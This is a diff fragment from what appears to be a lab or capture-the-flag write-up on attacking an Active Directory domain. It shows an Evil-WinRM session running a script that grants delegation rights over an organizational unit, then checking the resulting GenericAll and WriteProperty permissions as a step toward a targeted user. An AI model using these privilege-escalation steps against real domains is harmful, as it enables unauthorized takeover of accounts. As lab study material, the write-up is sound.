@@ -1140,7 +1140,40 @@ User: l.harrow
 So `m.mignola` is probably the user i want to be targeting here!
 
 
+```python
+*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\Configure-OUDelegation.ps1
 
+
+Name          : Configure-OUDelegation
+InstanceGuid  : {D464EA73-8DF9-4D0F-A670-E51EAC08CF3B}
+Path          : \Configure-OUDelegation
+State         : 4
+CurrentAction : powershell.exe
+EnginePID     : 1600
+```
+So now ive executed this i should have some permissions on the senior dev ops OU
+
+
+```python
+*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> .\check_ou_permissions.ps1
+
+===== Checking OU: OU=Senior Dev Ops,DC=novacart,DC=local =====
+Match found!
+Principal : NOVACART\Directory Ops
+Rights    : DeleteChild, WriteProperty
+Type      : Allow
+Inherited : False
+-----------------------------------
+
+===== Checking OU: OU=Dev Ops,DC=novacart,DC=local =====
+Match found!
+Principal : NOVACART\Directory Ops
+Rights    : GenericAll
+Type      : Allow
+Inherited : False
+-----------------------------------
+*Evil-WinRM* PS C:\Users\cliff.b\Task Scripts> 
+```
 
 
 
